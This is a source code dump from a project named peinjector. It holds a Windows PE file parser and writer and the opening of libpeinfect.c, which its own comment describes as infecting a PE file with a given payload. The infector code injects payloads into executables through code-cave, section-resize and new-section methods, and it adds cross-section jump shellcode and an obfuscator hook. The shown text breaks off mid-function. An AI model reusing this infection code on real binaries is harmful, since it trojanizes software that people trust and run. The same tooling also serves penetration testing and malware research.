      for (ii = 0; ii < in->pe_header.NumberOfSections; ++ii) {
        section_end = in->section_header[ii].PointerToRawData + in->section_header[ii].SizeOfRawData;
        if (((in->additional_data[i].position >= in->section_header[ii].PointerToRawData)
            && in->additional_data[i].position < section_end)
            || ((additional_end > in->section_header[ii].PointerToRawData) && additional_end < section_end)) {
          return 0;
        }
      }
    }
  }

  /* Validate Section positions */
  for (i = 0; i < in->pe_header.NumberOfSections; ++i) {
    if ((in->section_header[i].PointerToRawData + in->section_header[i].SizeOfRawData) > size) {
      return 0;
    }
  }

  return size;
}

/* Adds additional data to an pe file structure. Return true on success, false otherwise*/
static inline bool __pefile_add_additional_data(unsigned char *mem, size_t position, size_t size, PEFILE *out) {
  DATA_BLOB_EX *newAdditional = NULL;

  out->additional_count++;
  newAdditional = realloc(out->additional_data, out->additional_count * sizeof(DATA_BLOB_EX));

  /* Couldn't allocate memory */
  if (newAdditional == NULL) {
    return false;
  }
  out->additional_data = newAdditional;
  out->additional_data[out->additional_count - 1].position = position;
  out->additional_data[out->additional_count - 1].memsize = size;
  out->additional_data[out->additional_count - 1].mem = malloc(out->additional_data[out->additional_count - 1].memsize);

  /* Couldn't allocate memory */
  if (out->additional_data[out->additional_count - 1].mem == NULL) {
    return false;
  }
  memcpy(out->additional_data[out->additional_count - 1].mem,
      mem + out->additional_data[out->additional_count - 1].position,
      out->additional_data[out->additional_count - 1].memsize);

  return true;
}

void pefile_init(PEFILE *in) {
  memset(in, 0, sizeof(PEFILE));
}

bool pefile_read_mem(unsigned char *mem, size_t memsize, PEFILE_READ_OPTIONS *options, PEFILE *out) {
  DOS_HEADER *dHead = NULL;
  PE_HEADER *pHead = NULL;
  OPTIONAL_HEADER_32 *oHead32 = NULL;
  OPTIONAL_HEADER_64 *oHead64 = NULL;
  SECTION_HEADER *firstsHead = NULL;
  unsigned char *dos_stub = NULL;
  size_t dos_stubsize = 0;
  size_t header_raw_end = 0;
  size_t header_padding_end = 0;
  size_t additional_end = 0;
  size_t additional_start = 0;
  size_t gap_start = 0;
  size_t gap_size = 0;
  size_t i = 0;
  size_t ii = 0;

  /* Zero first */
  memset(out, 0, sizeof(PEFILE));

  /* DOS Header  Magic OK & Size OK */
  dHead = (DOS_HEADER*) mem;
  if ((memsize < sizeof(DOS_HEADER)) || (dHead->e_magic != MZ_MAGIC)) {
    return false;
  }

  /* PE Header Magic OK & Size OK) */
  pHead = (PE_HEADER *) (mem + dHead->e_lfanew);
  if ((memsize < dHead->e_lfanew + sizeof(PE_HEADER)) || (pHead->Signature != NT_MAGIC)) {
    return false;
  }

  /* Save DOS Stub */
  /* Sometimes there is no DOS Stub, the PE Header can be inside the DOS Header */
  if (dHead->e_lfanew >= sizeof(DOS_HEADER) && (dHead->e_lfanew - sizeof(DOS_HEADER) > 0)) {
    dos_stub = mem + sizeof(DOS_HEADER);
    dos_stubsize = dHead->e_lfanew - sizeof(DOS_HEADER);
  }

  /* Optional Header Magic OK & Size OK */
  oHead32 = (OPTIONAL_HEADER_32 *) (mem + dHead->e_lfanew + sizeof(PE_HEADER));
  oHead64 = (OPTIONAL_HEADER_64 *) oHead32;
  if (pHead->SizeOfOptionalHeader > 0) {
    if ((memsize < ((size_t) oHead32 - (size_t) mem) + pHead->SizeOfOptionalHeader)
        || ((oHead32->Magic != NT_OPTIONAL_32_MAGIC) && (oHead64->Magic != NT_OPTIONAL_64_MAGIC))) {
      return false;
    }
  }

  /* Section Table. Size Ok? */
  if (memsize
      < (dHead->e_lfanew + sizeof(PE_HEADER) + pHead->SizeOfOptionalHeader
          + pHead->NumberOfSections * sizeof(SECTION_HEADER))) {
    return false;
  } else {
    firstsHead = (SECTION_HEADER *) (mem + dHead->e_lfanew + sizeof(PE_HEADER) + pHead->SizeOfOptionalHeader);
  }

  /* Find real end of Header padding (Packers doing some shit with that ...) */
  /* Raw end and padding end defined in Optional Header*/
  header_raw_end = dHead->e_lfanew + sizeof(PE_HEADER) + pHead->SizeOfOptionalHeader
      + pHead->NumberOfSections * sizeof(SECTION_HEADER);
  if (oHead32->Magic == NT_OPTIONAL_32_MAGIC) {
    header_padding_end = oHead32->SizeOfHeaders;
  } else {
    header_padding_end = oHead64->SizeOfHeaders;
  }

  /* Section starting inside padding */
  for (i = 0; i < pHead->NumberOfSections; ++i) {
    if ((firstsHead[i].SizeOfRawData > 0) && firstsHead[i].PointerToRawData < header_padding_end) {
      /* Section inside Header */
      if (firstsHead[i].PointerToRawData < header_raw_end) {
        return false;
      }
      header_padding_end = firstsHead[i].PointerToRawData;
    }
  }

  /* Header Padding in virtual space */
  if (header_padding_end > memsize) {
    header_padding_end = memsize;
    /* But must go till Section 0 */
  } else if ((pHead->NumberOfSections > 0) && header_padding_end < firstsHead[0].PointerToRawData) {
    header_padding_end = firstsHead[0].PointerToRawData;
  }

  /* Copy DOS & PE Header*/
  memcpy(&out->dos_header, dHead, sizeof(DOS_HEADER));
  memcpy(&out->pe_header, pHead, sizeof(PE_HEADER));

  /* Copy DOS Stub */
  if (dos_stub != NULL) {
    out->dos_stub.mem = malloc(dos_stubsize);
    out->dos_stub.memsize = dos_stubsize;
    memcpy(out->dos_stub.mem, dos_stub, dos_stubsize);
  }

  /* Copy Optional Header */
  if (pHead->SizeOfOptionalHeader > 0) {
    if (oHead32->Magic == NT_OPTIONAL_32_MAGIC) {
      memcpy(&out->optional_header_32, oHead32, MIN(pHead->SizeOfOptionalHeader, sizeof(OPTIONAL_HEADER_32)));

      /* Rare: Gap between Optional Header an Section Table */
      if (pHead->SizeOfOptionalHeader > sizeof(OPTIONAL_HEADER_32)) {
        gap_start = dHead->e_lfanew + sizeof(PE_HEADER) + sizeof(OPTIONAL_HEADER_32);
        gap_size = pHead->SizeOfOptionalHeader - sizeof(OPTIONAL_HEADER_32);
      }
    } else {
      memcpy(&out->optional_header_64, oHead64, MIN(pHead->SizeOfOptionalHeader, sizeof(OPTIONAL_HEADER_64)));

      /* Rare: Gap between Optional Header an Section Table */
      if (pHead->SizeOfOptionalHeader > sizeof(OPTIONAL_HEADER_64)) {
        gap_start = dHead->e_lfanew + sizeof(PE_HEADER) + sizeof(OPTIONAL_HEADER_64);
        gap_size = pHead->SizeOfOptionalHeader - sizeof(OPTIONAL_HEADER_64);
      }
    }

    /* Copy gap data if needed */
    if (gap_start > 0) {
      out->optional_header_gap.memsize = gap_size;
      out->optional_header_gap.mem = malloc(gap_size);

      /* Couldn't allocate memory */
      if (out->optional_header_gap.mem == NULL) {
        pefile_free(out);
        return false;
      }
      memcpy(out->optional_header_gap.mem, mem + gap_start, gap_size);
    }
  }

  /* Copy Section Headers & Sections */
  if (firstsHead != NULL && pHead->NumberOfSections > 0) {
    out->section_header = malloc(pHead->NumberOfSections * sizeof(SECTION_HEADER));

    /* Couldn't allocate memory */
    if (out->section_header == NULL) {
      pefile_free(out);
      return false;
    }
    memcpy(out->section_header, firstsHead, pHead->NumberOfSections * sizeof(SECTION_HEADER));

    /* Only if full analysis */
    if ((options == NULL) || ((options != NULL) && !options->header_only)) {
      /* Copy Sections & Additional Data */
      out->section_data = malloc(pHead->NumberOfSections * sizeof(DATA_BLOB));
      for (i = 0; i < pHead->NumberOfSections; ++i) {
        if (firstsHead[i].SizeOfRawData) {
          out->section_data[i].memsize = firstsHead[i].SizeOfRawData;
          out->section_data[i].mem = malloc(out->section_data[i].memsize);

          /* Couldn't allocate memory */
          if (out->section_data[i].mem == NULL) {
            pefile_free(out);
            return false;
          }
          memcpy(out->section_data[i].mem, mem + firstsHead[i].PointerToRawData, out->section_data[i].memsize);

          /* Find additional Data between sections */
          additional_start = firstsHead[i].PointerToRawData + firstsHead[i].SizeOfRawData;
          additional_end = memsize;
          for (ii = 0; ii < pHead->NumberOfSections; ++ii) {
            if (i == ii) {
              continue;
            }
            if (firstsHead[ii].PointerToRawData == additional_start) {
              additional_end = additional_start;
              break;
            } else if ((firstsHead[ii].PointerToRawData > additional_start)
                && (firstsHead[ii].PointerToRawData < additional_end)) {
              additional_end = firstsHead[ii].PointerToRawData;
              /* nested sections */
            } else if ((firstsHead[ii].PointerToRawData <= firstsHead[i].PointerToRawData)
                && ((firstsHead[ii].PointerToRawData + firstsHead[ii].SizeOfRawData) >= additional_start)) {
              additional_end = additional_start;
              break;
            }
          }

          /* Additional data found */
          if ((additional_start != additional_end)
              && !__pefile_add_additional_data(mem, additional_start, additional_end - additional_start, out)) {

            /* Something went wrong, terminate */
            pefile_free(out);
            return false;
          }

        }
      }

      /* Force add data (everything after header, useful for truncated pe files
       * which shall be reassembled later */
    } else if (options->force_additional && (memsize - header_padding_end > 0)
        && !__pefile_add_additional_data(mem, header_padding_end, memsize - header_padding_end, out)) {

      /* Something went wrong, terminate */
      pefile_free(out);
      return false;
    }

  } else if ((options != NULL) && !(options->header_only && !options->force_additional)) {
    /* No Sections: Everything else is additional */
    if ((memsize - header_padding_end) > 0
        && !__pefile_add_additional_data(mem, header_padding_end, memsize - header_padding_end, out)) {

      /* Something went wrong, terminate */
      pefile_free(out);
      return false;
    }

  }

  /* Copy real Header Padding */
  out->header_padding.position = header_raw_end; /* Won't be used for building, just a shortcut to real header size */
  if (header_padding_end - header_raw_end > 0) {
    out->header_padding.memsize = header_padding_end - header_raw_end;
    out->header_padding.mem = malloc(out->header_padding.memsize);
    memcpy(out->header_padding.mem, mem + header_raw_end, out->header_padding.memsize);
  }

  return true;
}

bool pefile_read_file(char *file, PEFILE_READ_OPTIONS *options, PEFILE *out) {
  bool returnVar = false;
  unsigned char *file_mem;

  /* Open file */
  FILE *fh = fopen(file, "rb");

  if (fh != NULL) {

    /* Get file size and allocate buffer */
    fseek(fh, 0L, SEEK_END);
    size_t size = ftell(fh);
    size_t read_size = 0;
    rewind(fh);
    file_mem = malloc(size);

    if (file_mem != NULL) {
      /* Load file into buffer */
      read_size = fread(file_mem, size, 1, fh);
      fclose(fh);
      fh = NULL;

      /* Process PE file in memory */
      if (read_size == 1) {
        returnVar = pefile_read_mem(file_mem, size, options, out);
      }
      
      /* free buffer after use */
      free(file_mem);
    }

    /* Close file (if memory allocation has failed) */
    if (fh != NULL) {
      fclose(fh);
    }
  }

  return returnVar;
}

bool pefile_write_mem(PEFILE *in, PEFILE_WRITE_OPTIONS *options, unsigned char **mem, size_t *memsize) {
  size_t position = 0;
  size_t i = 0;
  uint64_t checksum = 0;
  uint64_t top = 0xffffffff + 0x01;
  size_t gap_start = 0;
  size_t gap_size = 0;

  /* Allocate needed memory */
  *memsize = __pefile_calculate_raw_size(in, options);

  /* Try allocate memory */
  if (*memsize > 0) {
    *mem = malloc(*memsize);

    /* Couldn't allocate memory */
    if (mem == NULL) {
      return false;
    }
  } else {
    return false;
  }

  /* Write DOS Header*/
  memcpy(*mem, &in->dos_header, sizeof(DOS_HEADER));

  /* Write PE Header */
  position = in->dos_header.e_lfanew;
  memcpy(*mem + position, &in->pe_header, sizeof(PE_HEADER));

  /* Write DOS Stub if needed */
  if (in->dos_stub.memsize) {
    position = sizeof(DOS_HEADER);
    memcpy(*mem + position, in->dos_stub.mem, in->dos_stub.memsize);
  }

  /* Write Optional Header if needed */
  if (in->pe_header.SizeOfOptionalHeader > 0) {
    position = in->dos_header.e_lfanew + sizeof(PE_HEADER);
    if (in->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
      memcpy(*mem + position, &in->optional_header_32,
          MIN(in->pe_header.SizeOfOptionalHeader, sizeof(OPTIONAL_HEADER_32)));

      /* Rare: Gap between Optional Header an Section Table */
      if (in->pe_header.SizeOfOptionalHeader > sizeof(OPTIONAL_HEADER_32)) {
        gap_start = in->dos_header.e_lfanew + sizeof(PE_HEADER) + sizeof(OPTIONAL_HEADER_32);
        gap_size = in->pe_header.SizeOfOptionalHeader - sizeof(OPTIONAL_HEADER_32);
      }
    } else if (in->optional_header_64.Magic == NT_OPTIONAL_64_MAGIC) {
      memcpy(*mem + position, &in->optional_header_64,
          MIN(in->pe_header.SizeOfOptionalHeader, sizeof(OPTIONAL_HEADER_64)));

      /* Rare: Gap between Optional Header an Section Table */
      if (in->pe_header.SizeOfOptionalHeader > sizeof(OPTIONAL_HEADER_64)) {
        gap_start = in->dos_header.e_lfanew + sizeof(PE_HEADER) + sizeof(OPTIONAL_HEADER_64);
        gap_size = in->pe_header.SizeOfOptionalHeader - sizeof(OPTIONAL_HEADER_64);
      }
    }

    /* Fill gap if there is saved data */
    if (gap_start && (in->optional_header_gap.mem != NULL)) {
      memcpy(*mem + gap_start, in->optional_header_gap.mem, MIN(gap_size, in->optional_header_gap.memsize));
    }
  }

  /* Writes Section Table if needed */
  if (in->pe_header.NumberOfSections > 0) {
    position = in->dos_header.e_lfanew + sizeof(PE_HEADER) + in->pe_header.SizeOfOptionalHeader;
    memcpy(*mem + position, in->section_header, in->pe_header.NumberOfSections * sizeof(SECTION_HEADER));
  }

  /* Writes Header Padding if needed */
  if ((in->header_padding.mem != NULL) && (in->header_padding.position > 0)) {
    position = in->dos_header.e_lfanew + sizeof(PE_HEADER) + in->pe_header.SizeOfOptionalHeader
        + in->pe_header.NumberOfSections * sizeof(SECTION_HEADER);
    memcpy(*mem + position, in->header_padding.mem, in->header_padding.memsize);
  }

  /* Header Only */
  /* Exception: force_additional override */
  if (options != NULL && options->header_only && !options->force_additional) {
    return true;
  }

  /* Write additional Data */
  if (in->additional_count > 0) {
    for (i = 0; i < in->additional_count; ++i) {
      if (in->additional_data[i].mem != NULL) {
        memcpy(*mem + in->additional_data[i].position, in->additional_data[i].mem, in->additional_data[i].memsize);
      }
    }
  }

  /* Header Only */
  if (options != NULL && options->header_only) {
    return true;
  }

  /* Write Section Data */
  if (in->section_data != NULL) {
    for (i = 0; i < in->pe_header.NumberOfSections; ++i) {
      if (in->section_data[i].mem != NULL) {
        memcpy(*mem + in->section_header[i].PointerToRawData, in->section_data[i].mem,
            MIN(in->section_data[i].memsize, in->section_header[i].SizeOfRawData));
      }
    }
  }

  /* Recalculate checksum if forced & OptionalHeader is large enough*/
  if ((options != NULL)
      && (in->pe_header.SizeOfOptionalHeader > offsetof(OPTIONAL_HEADER_32, CheckSum) + sizeof(uint32_t))
      && options->recaluclate_checksum) {

    /* Position of CheckSum (32/64 Bit position is equal) */
    position = in->dos_header.e_lfanew + sizeof(PE_HEADER) + offsetof(OPTIONAL_HEADER_32, CheckSum);

    /* Calculate checksum for Image */
    for (i = 0; i < *memsize; i += 4) {
      if (i == position) {
        continue;
      }
      checksum = (checksum & 0xffffffff) + *(uint32_t *) (*mem + i) + (checksum >> 32);
      if (checksum > top) {
        checksum = (checksum & 0xffffffff) + (checksum >> 32);
      }
    }
    checksum = (checksum & 0xffff) + (checksum >> 16);
    checksum = (checksum) + (checksum >> 16);
    checksum = checksum & 0xffff;
    checksum += *memsize;

    /* Write checksum*/
    *(uint32_t *) (*mem + position) = checksum;
  }

  return true;
}

bool pefile_write_file(PEFILE *in, PEFILE_WRITE_OPTIONS *options, char* file) {
  bool returnVar = false;
  unsigned char *mem = NULL;
  unsigned char **mem_ref = (unsigned char **) &mem;
  size_t memsize = 0;

  /* Open file */
  FILE *fh = fopen(file, "wb");

  if (fh != NULL) {

    /* Generate PE File memory */
    if (pefile_write_mem(in, options, mem_ref, &memsize)) {

      /* Write to file and verify size */
      returnVar = (fwrite(mem, memsize, 1, fh) == 1) ? true : false;

      /* Free memory */
      free(mem);
    }

    /* Close file */
    fclose(fh);
  }

  return returnVar;
}

void pefile_free(PEFILE *in) {
  size_t i = 0;

  /* Free DOS stub */
  if (in->dos_stub.mem != NULL) {
    free(in->dos_stub.mem);
  }

  /* Free Optional Header Gap */
  if (in->optional_header_gap.mem != NULL) {
    free(in->optional_header_gap.mem);
  }

  /* Free Section Header */
  if (in->section_header != NULL) {
    free(in->section_header);
  }

  /* Free Header padding */
  if (in->header_padding.mem != NULL) {
    free(in->header_padding.mem);
  }

  /* Free Section data */
  if (in->section_data != NULL) {
    for (i = 0; i < in->pe_header.NumberOfSections; ++i) {
      if (in->section_data[i].mem != NULL) {
        free(in->section_data[i].mem);
      }
    }
    free(in->section_data);
  }

  /* Free additional data*/
  if (in->additional_count && (in->additional_data != NULL)) {
    for (i = 0; i < in->additional_count; ++i) {
      if (in->additional_data[i].mem != NULL) {
        free(in->additional_data[i].mem);
      }
    }
    free(in->additional_data);
  }

  /* Zero structure */
  memset(in, 0, sizeof(PEFILE));
}

```

`peinjector/libpefile.h`:

```h
/**
 * \file   libpefile.h
 * \author A.A.
 * \brief  Manages disassembly and reassembly of the PE COFF File Format
 */

#ifndef LIBPEFILE_H_
#define LIBPEFILE_H_

#include <stdbool.h>
#include "def/headers.h"

/**
 * Hold binary data in pefile structure
 */
typedef struct _DATA_BLOB {
  unsigned char *mem; //!< Pointer to memory
  size_t memsize;     //!< Size of memory
} DATA_BLOB;

/**
 * Hold binary data and position in pefile structure
 */
typedef struct _DATA_BLOB_EX {
  unsigned char *mem; //!< Pointer to memory
  size_t memsize;     //!< Size of memory
  size_t position;    //!< Position of memory
} DATA_BLOB_EX;

/**
 * PE File Format
 */
typedef struct _PEFILE {
  DOS_HEADER dos_header;                  //!< DOS Header
  PE_HEADER pe_header;                    //!< PE Header
  DATA_BLOB dos_stub;                     //!< DOS Stub Program
  OPTIONAL_HEADER_32 optional_header_32;  //!< Optional Header, 32 Bit
  OPTIONAL_HEADER_64 optional_header_64;  //!< Optional Header, 64 Bit
  DATA_BLOB optional_header_gap;          //!< Gap between Optional Header and Section Headers, rare.
  SECTION_HEADER *section_header;         //!< Section Headers
  DATA_BLOB *section_data;                //!< Section data
  DATA_BLOB_EX header_padding;            //!< Padding between Headers and Section data
  DATA_BLOB_EX *additional_data;          //!< Additional binary data inside PE File
  size_t additional_count;                //!< Additional binary data count
} PEFILE;

/**
 * Options for writing PE files
 */
typedef struct _PEFILE_WRITE_OPTIONS {
  bool recaluclate_checksum;  //!< Recalculate Image Checksum after writing
  bool header_only;           //!< Writes header only
  bool force_additional;      //!< Forces writing of additional data (only in combination with header_only)
} PEFILE_WRITE_OPTIONS;

/**
 * Options for reading PE files
 */
typedef struct _PEFILE_READ_OPTIONS {
  bool header_only;           //!< Analyzes header only
  bool force_additional;      //!< Forces reading of additional data (only in combination with header_only)
} PEFILE_READ_OPTIONS;

/**
 * Initializes PEFILE structure
 *
 */
void pefile_init(PEFILE *in);

/**
 * Parses PE File data from memory
 *
 * \param mem     Input memory
 * \param memsize Input memory size
 * \param options Options for reading, Ignored if NULL
 * \param out     Output PEFILE structure
 *
 * \return true on success, false otherwise
 */
bool pefile_read_mem(unsigned char *mem, size_t memsize, PEFILE_READ_OPTIONS *options, PEFILE *out);

/**
 * Parses PE File data from files
 *
 * \param file    Input file
 * \param options Options for reading, Ignored if NULL
 * \param out     Output PEFILE structure
 *
 * \return true on success, false otherwise
 */
bool pefile_read_file(char *file, PEFILE_READ_OPTIONS *options, PEFILE *out);

/**
 * Writes PE File data to memory
 *
 * \param in      Input PEFILE structure
 * \param options Options for writing, Ignored if NULL
 * \param mem     Output memory
 * \param memsize Output memory size
 *
 * \return true on success, false otherwise
 */
bool pefile_write_mem(PEFILE *in, PEFILE_WRITE_OPTIONS *options, unsigned char **mem, size_t *memsize);

/**
 * Writes PE File data to files
 *
 * \param in      Input PEFILE structure
 * \param options Options for writing, Ignored if NULL
 * \param file    Output file
 *
 * \return true on success, false otherwise
 */
bool pefile_write_file(PEFILE *in, PEFILE_WRITE_OPTIONS *options, char* file);

/**
 * Clears PEFILE structure
 *
 * \param in      Input PEFILE structure
 */
void pefile_free(PEFILE *in);

#endif /* LIBPEFILE_H_ */

```

`peinjector/libpeinfect.c`:

```c
/*
 * \file   libpeinfect.c
 * \author A.A.
 * \brief  Infects a PE File with a given payload
 */

#include <time.h>
#include <stdlib.h>
#include "libpeinfect.h"
#include "libpeinfect_obfuscator.h"

/* Min/Max Macros */
#define MIN(_a, _b) ((_a) < (_b) ? (_a) : (_b))
#define MAX(_a, _b) ((_a) > (_b) ? (_a) : (_b))

/* Executable Section */
#define EXECUTABLE_CHARACTERISTICS (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE)

/* Patch Helper structure (INTERNAL USE ONLY) */
typedef struct _PATCH_HELPER {
  size_t infected_section;      // Infected section
  size_t old_rawsize;           // Old rawsize of section
  size_t old_virtualsize;       // Old virtualsize of section
  size_t old_rawheadersize;     // Old size of raw header
  size_t old_headerpaddingsize; // Old size of header padding
  size_t method;                // Method used
  struct _PATCH_HELPER *jmp;    // Cross section jmp
  unsigned char *jmp_code;      // Cross section jmp shellcode
  size_t jmpsize;               // Cross section jmp size
} PATCH_HELPER;

/* Debug, show patch */
static inline void __peinfect_patch_show_dbg(PEINFECT_PATCH *parent) {
  PEINFECT_PATCH *current = parent;
  if (current->next) {
    printf("--------------------\n");
  }
  while (current->next) {
    printf("Position:   %x\n", (uint32_t) current->position);
    printf("Size:       %x\n", (uint32_t) current->memsize);
    printf("Insert:     %x\n", (uint32_t) current->insert);
    printf("--------------------\n");
    current = current->next;
  }
}

/* Adds new patch part */
static inline PEINFECT_PATCH* __peinfect_add_patch_part(PEINFECT_PATCH *parent) {
  PEINFECT_PATCH *new_patch = calloc(1, sizeof(PEINFECT_PATCH));
  parent->next = new_patch;

  return new_patch;
}

/* Add memory patch part */
static inline PEINFECT_PATCH* __peinfect_add_patch_memory(PEINFECT_PATCH *parent, void *mem, size_t memsize,
    size_t position, bool insert) {
  parent->position = position;
  parent->memsize = memsize;
  parent->mem = malloc(parent->memsize);
  parent->insert = insert;

  /* Couldn't allocate memory */
  if (parent->mem == NULL) {
    return NULL;
  }

  /* Copy patch memory*/
  memcpy(parent->mem, mem, parent->memsize);

  /* Return next part*/
  return __peinfect_add_patch_part(parent);
}

/* Add PE Header patch part */
static inline PEINFECT_PATCH* __peinfect_add_patch_peheader(PEINFECT_PATCH *parent, PEFILE *in) {
  return __peinfect_add_patch_memory(parent, &in->pe_header, sizeof(PE_HEADER), in->dos_header.e_lfanew, false);
}

/* Add OptionalHeader patch part */
static inline PEINFECT_PATCH* __peinfect_add_patch_optionalheader(PEINFECT_PATCH *parent, PEFILE *in) {
  return __peinfect_add_patch_memory(parent,
      ((in->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) ?
          (void *) &in->optional_header_32 : (void *) &in->optional_header_64),
      MIN(in->pe_header.SizeOfOptionalHeader,
          ((in->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) ? sizeof(OPTIONAL_HEADER_32) : sizeof(OPTIONAL_HEADER_64)) - 10*sizeof(DATA_DIRECTORY)),
      (in->dos_header.e_lfanew + sizeof(PE_HEADER)), false);

  /**
   *  - 10*sizeof(DATA_DIRECTORY): The last DD we need to patch is DIR_SECURITY, so we can save 80 bytes.
   */
}

/* Add SectionTable patch part */
static inline PEINFECT_PATCH* __peinfect_add_patch_sectiontable(PEINFECT_PATCH *parent, PEFILE *in) {
  return __peinfect_add_patch_memory(parent, in->section_header,
      (in->pe_header.NumberOfSections * sizeof(SECTION_HEADER)),
      (in->dos_header.e_lfanew + sizeof(PE_HEADER) + in->pe_header.SizeOfOptionalHeader), false);
}

/* Add SectionTable Entry patch part */
static inline PEINFECT_PATCH* __peinfect_add_patch_section(PEINFECT_PATCH *parent, PEFILE *in, size_t section_index) {
  return __peinfect_add_patch_memory(parent, &in->section_header[section_index], sizeof(SECTION_HEADER),
      (in->dos_header.e_lfanew + sizeof(PE_HEADER) + in->pe_header.SizeOfOptionalHeader
          + section_index * sizeof(SECTION_HEADER)), false);
}

/* Merges small patch parts to bigger ones */
static inline void __peinfect_build_patch_aggregate(PEINFECT_PATCH *parent) {
  PEINFECT_PATCH *current = parent;
  PEINFECT_PATCH *next = NULL;
  PEINFECT_PATCH *prev = NULL;
  PEINFECT_PATCH *del = NULL;
  unsigned char *tmpmem = NULL;

  /* For each entry */
  while (current) {
    next = current->next;
    prev = current;

    /* Compare to next entrys */
    while (next) {
      del = NULL;

      /* Must have the same insertion mode.
       * (Could be done with different insertion modes, but we would have to do much
       * more complex checks and size-reduction will not be much more, so keep it simple)
       *  */
      if (next->insert == current->insert) {
        /* Select next and previous entry */
        prev = prev->next;
        if (prev) {
          next = prev->next;
        } else {
          next = NULL;
        }
        continue;
      }

      /* Same entry? */
      if ((current->position == next->position) && (current->memsize == next->memsize)) {
        /* Swap Memory */
        tmpmem = current->mem;
        current->mem = next->mem;
        next->mem = tmpmem;
        /* Remove from list*/
        prev->next = next->next;
        /* Mark for deletion */
        del = next;

        /* Connected entrys? */
      } else if ((current->position + current->memsize) == next->position) {

        /* Combine Memory */
        tmpmem = malloc(current->memsize + next->memsize);
        /* Can't combine */
        if (tmpmem == NULL) {
          continue;
        }
        memcpy(tmpmem, current->mem, current->memsize);
        memcpy(tmpmem + current->memsize, next->mem, next->memsize);
        /* Set new memory */
        free(current->mem);
        current->mem = tmpmem;
        current->memsize = current->memsize + next->memsize;
        /* Remove from list*/
        prev->next = next->next;
        /* Mark for deletion */
        del = next;

        /* Inside current */
      } else if ((current->position <= next->position)
          && ((current->position + current->memsize) >= (next->position + next->memsize))) {

        /* Insert */
        memcpy(current->mem + (next->position - current->position), next->mem, next->memsize);
        /* Remove from list*/
        prev->next = next->next;
        /* Mark for deletion */
        del = next;
      }

      /* Select next and previous entry */
      prev = prev->next;
      if (prev) {
        next = prev->next;
      } else {
        next = NULL;
      }

      /* Delete Entry */
      if (del) {
        if (del->mem) {
          free(del->mem);
        }
        free(del);
      }
    }
    current = current->next;
  }
}

/* Build patch chain for alignment method */
static inline PEINFECT_PATCH* __peinfect_build_patch_chain_alignment(PEINFECT_PATCH *parent, PEINFECT *infect,
    PEFILE *pe, unsigned char *payload, size_t payloadsize, bool section_table_patched, PATCH_HELPER *helper) {
  PEINFECT_PATCH *current = parent;

  if (helper == NULL) {
    return NULL;
  }

  /* Build patch chain */
  /* New Optional Header */
  if (current && (helper->jmp == NULL)) {
    current = __peinfect_add_patch_optionalheader(current, pe);
  }
  /* Modified Section Entry */
  if (current && !section_table_patched) {
    current = __peinfect_add_patch_section(current, pe, helper->infected_section);
  }
  /* Injected Memory */
  if (current) {
    current = __peinfect_add_patch_memory(current, payload, payloadsize,
        pe->section_header[helper->infected_section].PointerToRawData + helper->old_virtualsize, false);
  }

  return current;
}

/* Build patch chain for alignment resize method */
static inline PEINFECT_PATCH* __peinfect_build_patch_chain_alignment_resize(PEINFECT_PATCH *parent, PEINFECT *infect,
    PEFILE *pe, unsigned char *payload, size_t payloadsize, bool section_table_patched, PATCH_HELPER *helper) {
  PEINFECT_PATCH *current = parent;
  unsigned char *tmem;
  size_t tmemsize;

  if (helper == NULL) {
    return NULL;
  }

  /* Build patch chain */
  /* New Optional Header */
  if (current && (helper->jmp == NULL)) {
    current = __peinfect_add_patch_optionalheader(current, pe);
  }
  /* Modified SectionTable */
  if (current) {
    current = __peinfect_add_patch_sectiontable(current, pe);
  }
  if (current) {
    /* Needed (padding) */
    tmemsize = pe->section_header[helper->infected_section].SizeOfRawData - helper->old_virtualsize;
    tmem = calloc(1, tmemsize);
    /* INSERT MUST BE BEFORE OVERWRITE (PATCH-MERGE) */
    /* Injected Memory (insert) */
    if (tmem != NULL) {
      memcpy(tmem, payload, payloadsize);
      current = __peinfect_add_patch_memory(current, tmem + (helper->old_rawsize - helper->old_virtualsize),
          pe->section_header[helper->infected_section].SizeOfRawData - helper->old_rawsize,
          pe->section_header[helper->infected_section].PointerToRawData + helper->old_rawsize, true);
      free(tmem);
    } else {
      current = NULL;
    }
    /* Injected Memory (overwrite) */
    if (current) {
      current = __peinfect_add_patch_memory(current, tmem, (helper->old_rawsize - helper->old_virtualsize),
          pe->section_header[helper->infected_section].PointerToRawData + helper->old_virtualsize, false);
    }
  }

  return current;
}

/* Build patch chain for new section method */
static inline PEINFECT_PATCH* __peinfect_build_patch_chain_new_section(PEINFECT_PATCH *parent, PEINFECT *infect,
    PEFILE *pe, unsigned char *payload, size_t payloadsize, bool section_table_patched, PATCH_HELPER *helper) {
  PEINFECT_PATCH *current = parent;
  unsigned char *tmem;
  size_t tmemsize;
  size_t headerpadding_position;
  bool headerpadding_change = false;

  if (helper == NULL) {
    return NULL;
  }

  /* Build patch chain */
  /* Header padding changed? */
  headerpadding_position = pe->dos_header.e_lfanew + sizeof(PE_HEADER) + pe->pe_header.SizeOfOptionalHeader
      + pe->pe_header.NumberOfSections * sizeof(SECTION_HEADER);
  /* Very rare case, but this can happen, that's life ... */
  if (helper->old_rawheadersize < (headerpadding_position + pe->header_padding.memsize)) {
    headerpadding_change = true;
  }

  /* New PE Header */
  if (current) {
    current = __peinfect_add_patch_peheader(current, pe);
  }
  /* New Optional Header */
  if (current && (helper->jmp == NULL)) {
    current = __peinfect_add_patch_optionalheader(current, pe);
  }
  /* Modified Section Entry */
  if (current && !section_table_patched) {
    /* If headpadding has changed, all section postions are updated */
    if (headerpadding_change) {
      current = __peinfect_add_patch_sectiontable(current, pe);
    } else {
      current = __peinfect_add_patch_section(current, pe, helper->infected_section);
    }
  }

  /* pad headers */
  if (headerpadding_change) {
    /* Needed injection */
    tmemsize = (headerpadding_position + pe->header_padding.memsize) - helper->old_rawheadersize;
    tmem = malloc(tmemsize);
    if (tmem != NULL) {
      current = __peinfect_add_patch_memory(current, tmem, tmemsize, headerpadding_position, true);
      free(tmem);
    } else {
      current = NULL;
    }
  }

  /* Injected Memory */
  if (current) {
    /* Needed (padding) */
    tmemsize = pe->section_header[helper->infected_section].SizeOfRawData;
    tmem = malloc(tmemsize);
    /* No need to zero ...*/

    if (tmem != NULL) {
      memcpy(tmem, payload, payloadsize);
